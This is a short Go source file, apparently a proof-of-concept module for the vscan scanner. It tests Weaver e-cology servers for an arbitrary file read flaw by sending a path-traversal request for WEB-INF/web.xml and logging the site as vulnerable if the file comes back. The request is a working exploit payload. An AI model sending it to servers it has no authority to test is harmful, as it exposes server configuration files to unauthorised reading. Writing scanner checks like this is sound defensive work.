package weaver

import (
	"fmt"
	"github.com/veo/vscan/pkg"
	"strings"
)

//LnFileDownload 任意文件读取漏洞

func LnFileDownload(u string) bool {
	if req, err := pkg.HttpRequset(u+"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && strings.Contains(req.Body, "<web-app>") {
			pkg.GoPocLog(fmt.Sprintf("Found vuln weaver LnFileDownload|%s\n", u+"/weaver/ln.FileDownload?fpath=../ecology/WEB-INF/web.xml"))

			return true
		}
	}
	return false
}